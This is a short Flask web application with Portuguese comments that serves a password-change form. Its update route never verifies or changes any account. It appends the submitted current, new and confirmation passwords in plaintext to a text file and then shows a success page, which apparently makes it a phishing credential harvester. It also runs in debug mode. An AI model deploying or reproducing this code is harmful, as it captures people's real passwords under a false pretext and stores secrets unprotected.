from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/update-password', methods=['POST'])
def update_password():
    current_password = request.form['current-password']
    new_password = request.form['new-password']
    confirm_password = request.form['confirm-password']
    
    # Salvar os dados em um arquivo ou banco de dados
    with open('passwords.txt', 'a') as f:
        f.write(f"Senha atual: {current_password}\n")
        f.write(f"Nova senha: {new_password}\n")
        f.write(f"Confirmar senha: {confirm_password}\n")
        f.write('---\n')
    
    return redirect(url_for('success'))

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)
